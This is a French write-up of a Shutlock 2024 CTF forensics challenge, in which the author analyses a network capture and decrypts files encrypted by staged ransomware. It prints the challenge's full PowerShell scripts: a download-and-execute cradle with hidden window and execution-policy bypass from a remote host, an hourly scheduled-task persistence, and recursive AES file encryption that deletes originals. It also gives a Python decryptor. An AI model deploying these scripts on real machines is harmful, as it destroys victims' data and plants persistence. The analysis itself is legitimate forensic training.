+<p>Ceci est le write-up de la deuxième partie du challenge Forensic <strong>Enquête sur le phishing des JO</strong> du CTF <a href="https://shutlock.fr/">Shutlock</a> édition 2024 organisé par la DGSI et EPITA.</p>
+<h2 id="énoncé">Énoncé<a href="#énoncé" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Bravo !
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Vous voici dans la deuxième partie de votre enquête. Le dump réseau vous a été confié avec une partie de son système de fichiers.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">L&#39;utilisatrice à qui appartiennent ces informations, est une scientifique qui travaille sur le chiffrement du système d&#39;information des JO.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Aidez-la à déchiffrer son système de fichiers.
+</span></span></code></pre></div><p>Dans cette deuxième partie, on nous donne un fichier de capture réseau <strong>Capture.pcapng</strong> ainsi qu&rsquo;un dossier <strong>FileSystem</strong> qui correspond à une partie du système de fichier de l&rsquo;utilisatrice.</p>
+<p>Cette fois, nous ne sommes pas aussi guidé, on sait juste que le système a été chiffré et que l&rsquo;ont doit le déchiffrer.</p>
+<hr>
+<h2 id="investigation">Investigation<a href="#investigation" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+<h3 id="système-de-fichier">Système de fichier<a href="#système-de-fichier" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>La première chose que j&rsquo;ai fait a été de parcourir le dossier <strong>FileSystem</strong> afin d&rsquo;essayer de trouver une piste.</p>
+<p>En me rendant dans les dossier personnels de l&rsquo;utilisatrice (<strong>Desktop</strong>, <strong>Documents</strong> et <strong>Downloads</strong>), je me suis rendu compte que des objets portent l&rsquo;extension <code>.shutlock</code>, notamment un objet <strong>importante_recherche.shutlock</strong>. Les ouvrir ne sert à rien car il n&rsquo;y a rien de lisible, on a surement trouvé les fichiers chiffrés.</p>
+<p>On peut également remarquer un fichier nommé <strong>iv</strong> dans le dossier <strong>Documents</strong>, il n&rsquo;a rien à faire la et on peut supposer qu&rsquo;il à servit au chiffrement des données, on le met donc de côté.</p>
+<p>On à également un dossier <strong>AppData</strong> mais rien n&rsquo;a l&rsquo;air intéressant de prime abord, on y reviendra suremment plus tard.</p>
+<p>Après avoir fait le tour du dossier, on peut aller voir du côté de la capture réseau.</p>
+<h3 id="capture-réseau">Capture réseau<a href="#capture-réseau" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>Afin d&rsquo;analyser cette capture, on ouvre le fichier avec <a href="https://www.wireshark.org/">Wireshark</a> (ou <a href="https://www.wireshark.org/docs/man-pages/tshark.html">Tshark</a> pour la version CLI), on se rend alors compte que le fichier est très gros et que chercher &ldquo;a la main&rdquo; n&rsquo;est pas la solution la plus efficace.</p>
+<p>Afin de dégrossire tout ça, on va chercher à identifier l&rsquo;adresse du PC en listant les adresses privées, pour ça il faut se rendre dans <code>Statistiques &gt; Points de terminaison &gt; IPV4</code>.</p>
+<p>On trouve alors deux adresses IP privées, la <strong>192.168.1.1</strong> et la <strong>10.0.2.15</strong>.</p>
+<p>On peut revenir sur la capture et filtrer les résultats pour avoir l&rsquo;une ou l&rsquo;autre des adresses: <code>ip.addr==192.168.1.1 || ip.addr==10.0.2.15</code>.</p>
+<p>Bien que cela ait un peu réduit le nombre d&rsquo;entrées, il rest encore beaucoup d&rsquo;entrées, on remarque également qu&rsquo;il y a beaucoup de requêtes TCP, on peut alors aller regarder les protocoles présents en se rendant dans <code>Statistiques &gt; Hiérarchie des Protocoles</code>.</p>
+<p>Le tableau qui s&rsquo;affiche nous apprend qu&rsquo;il y a du, TLS, du DNS mais surtout des transferts de fichiers en HTTP (JPEG, du texte, etc.). ça ressemble à une piste.</p>
+<p>Afin de voir les fichiers échangés en HTTP, il faut se rendre dans <code>Fichier &gt; Exporter Objets &gt; HTTP...</code> et regrouper les adresses IPs d&rsquo;un côté et les noms d&rsquo;hôtes de l&rsquo;autre en cliquant sur &ldquo;Organiser par nom d&rsquo;hôte&rdquo; en haut.</p>
+<p>On peut voir que plusieurs fichiers ont été échangés avec l&rsquo;IP <strong>172.21.195.17</strong>, soit:</p>
+<ul>
+<li><strong>Enigma.ps1</strong></li>
+<li><strong>Tirage_au_sort_pour_gagner_des_places_aux_Jeux_Olympiques_de_Paris_2024.pdf</strong></li>
+<li><strong>Encrypt.ps1</strong></li>
+<li><strong>key.txt</strong></li>
+<li><strong>wallpaper.jpg</strong></li>
+</ul>
+<p>Les plus intéressants sont <strong>Enigma.ps1</strong>, <strong>Encrypt.ps1</strong> et <strong>key.txt</strong>, on les téléchargent.</p>
+<h3 id="analyse-des-scripts">Analyse des scripts<a href="#analyse-des-scripts" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>Ces scripts powershell sont très certainement ceux qui ont été utilisés pour chiffrer le PC, on va donc essayer de comprendre ce qu&rsquo;ils font.</p>
+<h4 id="enigmaps1">Enigma.ps1<a href="#enigmaps1" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ps1" data-lang="ps1"><span class="line"><span class="cl"><span class="nv">$IP_addr</span> <span class="p">=</span> <span class="s1">&#39;172.21.195.17:5000&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$urlFakeJob</span> <span class="p">=</span> <span class="s2">&#34;http://</span><span class="nv">$IP_addr</span><span class="s2">/Holmes/Tirage_au_sort_pour_gagner_des_places_aux_Jeux_Olympiques_de_Paris_2024.pdf&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$urlTask</span> <span class="p">=</span> <span class="s2">&#34;http://</span><span class="nv">$IP_addr</span><span class="s2">/Holmes/GetFileInfo.ps1&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$fakePlaceOffer</span> <span class="p">=</span> <span class="s1">&#39;Tirage_au_sort_pour_gagner_des_places_aux_Jeux_Olympiques_de_Paris_2024.pdf&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$TaskFile</span> <span class="p">=</span> <span class="s1">&#39;GetFilesInfo.ps1&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">#Get the lure pdf</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="nv">$urlFakeJob</span> <span class="n">-OutFile</span> <span class="nv">$fakePlaceOffer</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># Open the PDF file with the default PDF viewer</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Start-Process</span> <span class="n">-FilePath</span> <span class="nv">$fakePlaceOffer</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">### Schedule task</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$taskName</span> <span class="p">=</span> <span class="s2">&#34;IGotYourFileInfo&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># Create the scheduled task that get some file information</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$cmd</span> <span class="p">=</span> <span class="s2">&#34;Invoke-WebRequest -Uri </span><span class="nv">$urlTask</span><span class="s2"> -OutFile </span><span class="nv">$TaskFile</span><span class="s2"> ; Start-Process -FilePath </span><span class="nv">$TaskFile</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">schtasks</span> <span class="p">/</span><span class="n">create</span> <span class="p">/</span><span class="n">tn</span> <span class="nv">$taskName</span> <span class="p">/</span><span class="nb">sc </span><span class="n">HOURLY</span> <span class="p">/</span><span class="n">tr</span> <span class="nv">$cmd</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">#Encrypt some file</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">powershell</span><span class="p">.</span><span class="py">exe</span> <span class="n">-WindowStyle</span> <span class="n">hidden</span> <span class="n">-ExecutionPolicy</span> <span class="n">Bypass</span> <span class="n">-nologo</span> <span class="n">-noprofile</span>  <span class="n">-c</span> <span class="s2">&#34;&amp; {IEX ((New-Object Net.WebClient).DownloadString(&#39;http://</span><span class="nv">$IP_addr</span><span class="s2">/Holmes/Encrypt.ps1&#39;))}&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">## Change wallpaper</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$webClient</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">Net</span><span class="p">.</span><span class="py">WebClient</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$wallpaperUrl</span> <span class="p">=</span> <span class="s2">&#34;http://</span><span class="nv">$IP_addr</span><span class="s2">/Holmes/wallpaper.jpg&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$wallpaperPath</span> <span class="p">=</span> <span class="s2">&#34;</span><span class="nv">$env:USERPROFILE</span><span class="s2">\Desktop\wallpaper.jpg&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$webClient</span><span class="p">.</span><span class="py">DownloadFile</span><span class="p">(</span><span class="nv">$wallpaperUrl</span><span class="p">,</span> <span class="nv">$wallpaperPath</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">## Set the wallpaper</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$regKey</span> <span class="p">=</span> <span class="s2">&#34;HKCU:\Control Panel\Desktop&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Set-ItemProperty</span> <span class="n">-Path</span> <span class="nv">$regKey</span> <span class="n">-Name</span> <span class="n">Wallpaper</span> <span class="n">-Value</span> <span class="nv">$wallpaperPath</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$wallpaperStyle</span> <span class="p">=</span> <span class="s2">&#34;3&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Set-ItemProperty</span> <span class="n">-Path</span> <span class="nv">$regKey</span> <span class="n">-Name</span> <span class="n">WallpaperStyle</span> <span class="n">-Value</span> <span class="nv">$wallpaperStyle</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$tileWallpaper</span> <span class="p">=</span> <span class="s2">&#34;0&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Set-ItemProperty</span> <span class="n">-Path</span> <span class="nv">$regKey</span> <span class="n">-Name</span> <span class="n">TileWallpaper</span> <span class="n">-Value</span> <span class="nv">$tileWallpaper</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># Forcer l&#39;actualisation du bureau</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Start-Process</span> <span class="n">-FilePath</span> <span class="s2">&#34;RUNDLL32.EXE&#34;</span> <span class="n">-ArgumentList</span> <span class="s2">&#34;USER32.DLL,UpdatePerUserSystemParameters ,1 ,True&#34;</span> <span class="n">-Wait</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">## Create text file</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$fileContent</span> <span class="p">=</span> <span class="s2">&#34;YOU HAVE BEEN INFECTED BY THE HAMOR FIND THE KEY TO RETREIVE YOUR FILE&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Set-Content</span> <span class="s2">&#34;</span><span class="nv">$env:USERPROFILE</span><span class="s2">\Desktop\instructions.txt&#34;</span> <span class="n">-Value</span> <span class="nv">$fileContent</span>
+</span></span><span class="line"><span class="cl"><span class="c"># Open text file</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Invoke-Item</span> <span class="s2">&#34;</span><span class="nv">$env:USERPROFILE</span><span class="s2">\Desktop\instructions.txt&#34;</span>
+</span></span></code></pre></div><p>Ce script est celui qui a très certainement été lancé en premier, il va créer la tâche planifiée vu avant, chiffrer les fichiers, changer le fond d&rsquo;écran et créer le fichier instructions.txt.</p>
+<p>La seule ligne qui nous intéresse pour déchiffrer les fichier est celle la:
+<code>powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile  -c &quot;&amp; {IEX ((New-Object Net.WebClient).DownloadString('http://$IP_addr/Holmes/Encrypt.ps1'))}&quot;</code></p>
+<p>Elle appelle le script <strong>Encrypt.ps1</strong> qui est en charge de chiffrer les fichiers sur le bureau.</p>
+<h4 id="encryptps1">Encrypt.ps1<a href="#encryptps1" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ps1" data-lang="ps1"><span class="line"><span class="cl"><span class="c"># Define the directories to search for files</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$IP_addr</span> <span class="p">=</span> <span class="s1">&#39;172.21.195.17:5000&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$directories</span> <span class="p">=</span> <span class="vm">@</span><span class="p">(</span><span class="s2">&#34;</span><span class="nv">$env:USERPROFILE</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># Define the file extensions to encrypt</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$extensions</span> <span class="p">=</span> <span class="vm">@</span><span class="p">(</span><span class="s2">&#34;.png&#34;</span><span class="p">,</span> <span class="s2">&#34;.doc&#34;</span><span class="p">,</span> <span class="s2">&#34;.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;.zip&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$keyUrl</span> <span class="p">=</span> <span class="s2">&#34;http://</span><span class="nv">$IP_addr</span><span class="s2">/Holmes/key.txt&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># Download the key from the URL</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$keyContent64</span> <span class="p">=</span> <span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="nv">$keyUrl</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">-ExpandProperty</span> <span class="n">Content</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$keyContent</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.Text.Encoding</span><span class="p">]::</span><span class="n">UTF8</span><span class="p">.</span><span class="py">GetString</span><span class="p">([</span><span class="no">System.Convert</span><span class="p">]::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="nv">$keyContent64</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># Use SHA-256 hash function to produce a 32-byte key</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$sha256</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.Security.Cryptography.SHA256</span><span class="p">]::</span><span class="n">Create</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$key</span> <span class="p">=</span> <span class="nv">$sha256</span><span class="p">.</span><span class="py">ComputeHash</span><span class="p">([</span><span class="no">System.Text.Encoding</span><span class="p">]::</span><span class="n">UTF8</span><span class="p">.</span><span class="py">GetBytes</span><span class="p">(</span><span class="nv">$keyContent</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$iv</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.Security.Cryptography.RijndaelManaged</span><span class="p">]::</span><span class="n">Create</span><span class="p">().</span><span class="py">IV</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># Sauvegarder l&#39;IV dans un fichier</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$ivFilePath</span> <span class="p">=</span> <span class="s2">&#34;</span><span class="nv">$env:USERPROFILE</span><span class="s2">\Documents\iv&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="no">System.IO.File</span><span class="p">]::</span><span class="n">WriteAllBytes</span><span class="p">(</span><span class="nv">$ivFilePath</span><span class="p">,</span> <span class="nv">$iv</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># Create a new RijndaelManaged object with the specified key</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$rijndael</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">Security</span><span class="p">.</span><span class="py">Cryptography</span><span class="p">.</span><span class="py">RijndaelManaged</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$rijndael</span><span class="p">.</span><span class="py">Key</span> <span class="p">=</span> <span class="nv">$key</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$rijndael</span><span class="p">.</span><span class="py">IV</span> <span class="p">=</span> <span class="nv">$iv</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$rijndael</span><span class="p">.</span><span class="py">Mode</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.Security.Cryptography.CipherMode</span><span class="p">]::</span><span class="n">CBC</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$rijndael</span><span class="p">.</span><span class="py">Padding</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.Security.Cryptography.PaddingMode</span><span class="p">]::</span><span class="n">PKCS7</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># Go through each directory</span>
+</span></span><span class="line"><span class="cl"><span class="k">foreach</span> <span class="p">(</span><span class="nv">$dir</span> <span class="k">in</span> <span class="nv">$directories</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c"># Go through each file</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">Get-ChildItem</span> <span class="n">-Path</span> <span class="nv">$dir</span> <span class="n">-Recurse</span> <span class="p">|</span> <span class="nb">ForEach-Object</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c"># Check the file extension</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$extensions</span> <span class="o">-contains</span> <span class="nv">$_</span><span class="p">.</span><span class="n">Extension</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="c"># Generate the new file name</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$newName</span> <span class="p">=</span> <span class="nv">$_</span><span class="p">.</span><span class="py">FullName</span> <span class="o">-replace</span> <span class="nv">$_</span><span class="p">.</span><span class="n">Extension</span><span class="p">,</span> <span class="s2">&#34;.shutlock&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="c"># Read the file contents in bytes</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$contentBytes</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.IO.File</span><span class="p">]::</span><span class="n">ReadAllBytes</span><span class="p">(</span><span class="nv">$_</span><span class="p">.</span><span class="n">FullName</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="c"># Create a new encryptor</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$encryptor</span> <span class="p">=</span> <span class="nv">$rijndael</span><span class="p">.</span><span class="py">CreateEncryptor</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="c"># Encrypt the content</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$encryptedBytes</span> <span class="p">=</span> <span class="nv">$encryptor</span><span class="p">.</span><span class="py">TransformFinalBlock</span><span class="p">(</span><span class="nv">$contentBytes</span><span class="p">,</span> <span class="mf">0</span><span class="p">,</span> <span class="nv">$contentBytes</span><span class="p">.</span><span class="n">Length</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="c"># Write the encrypted content to a file</span>
+</span></span><span class="line"><span class="cl">            <span class="p">[</span><span class="no">System.IO.File</span><span class="p">]::</span><span class="n">WriteAllBytes</span><span class="p">(</span><span class="nv">$newName</span><span class="p">,</span> <span class="nv">$encryptedBytes</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="c"># Delete the original file</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">Remove-Item</span> <span class="nv">$_</span><span class="p">.</span><span class="py">FullName</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Grâce aux commentaires, on comprend sans lire le code, a peu près ce qu&rsquo;il fait:</p>
+<ul>
+<li>Définis les extensions à cibler</li>
+<li>Récupère la clé et la hash via SHA-256</li>
+<li>Créé l&rsquo;iv et le sauvegarde dans un fichier</li>
+<li>Créé un objet <strong>RijndaelManaged</strong></li>
+<li>Chiffre les fichiers de manière récursive</li>
+</ul>
+<p>Maintenant que l&rsquo;ont sait ça, on a besoin de déterminer (même si on peut s&rsquo;en douter) quel méthode de chiffrement a été utilisée, on cherche alors ce qu&rsquo;est l&rsquo;objet <strong>RijndaelManaged</strong> en Powershell et on tombe sur cet <a href="https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.rijndael?view=net-8.0">article</a> qui nous explique que c&rsquo;est, grosso modo, de l&rsquo;<strong>AES</strong>.</p>
+<p>L&rsquo;AES étant un algorithme de chiffrement symétrique, il n&rsquo;y a qu&rsquo;une seule clé pour les deux opérations, ont a alors tout ce qu&rsquo;il faut pour déchiffrer les fichiers.</p>
+<h3 id="déchiffrement-des-fichiers">Déchiffrement des fichiers<a href="#déchiffrement-des-fichiers" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>Pour faire ça, j&rsquo;ai écrit le script Python suivant:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.Padding</span> <span class="kn">import</span> <span class="n">unpad</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">path_iv</span><span class="p">,</span><span class="n">path_key</span><span class="p">,</span><span class="n">file</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">iv</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">path_iv</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span><span class="s2">&#34;rb&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">b64_key</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">path_key</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">b64_key</span><span class="p">))</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">enc_file</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="n">file</span><span class="p">,</span><span class="s2">&#34;rb&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">dec_file</span><span class="o">=</span><span class="n">unpad</span><span class="p">(</span><span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">enc_file</span><span class="p">),</span><span class="n">AES</span><span class="o">.</span><span class="n">block_size</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">open</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">file</span><span class="si">}</span><span class="s2">.dec&#34;</span><span class="p">,</span><span class="s2">&#34;wb&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">dec_file</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">file</span><span class="o">=</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">iv</span> <span class="o">=</span> <span class="s2">&#34;path/to/iv&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="s2">&#34;path/to/key&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">decrypt</span><span class="p">(</span><span class="n">iv</span><span class="p">,</span><span class="n">key</span><span class="p">,</span><span class="n">file</span><span class="p">)</span>
+</span></span></code></pre></div><p>Il va permettre de déchiffrer le fichier en argument et lui rajouter l&rsquo;extension <strong>.dec</strong>.</p>
+<p>J&rsquo;utilise ce script pour déchiffrer (au hasard) l&rsquo;objet <strong>importante_recherche.shutlock</strong>? Afin de déterlinerquel est son extension d&rsquo;origine, on peut tout simplement utiliser la commande <strong>file</strong> sous Linux (ou a la main en regardant le <strong>Magic Byte</strong>):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">file importante_recherche.shutlock.dec
+</span></span><span class="line"><span class="cl">importante_recherche.shutlock.dec: Zip archive data, at least v5.1 to extract, compression method=AES Encrypted
+</span></span></code></pre></div><p>On a donc un <strong>.zip</strong>, la partie <strong>compression method=AES Encrypted</strong> nous indique qu&rsquo;il est protégé par un mot de passe.</p>
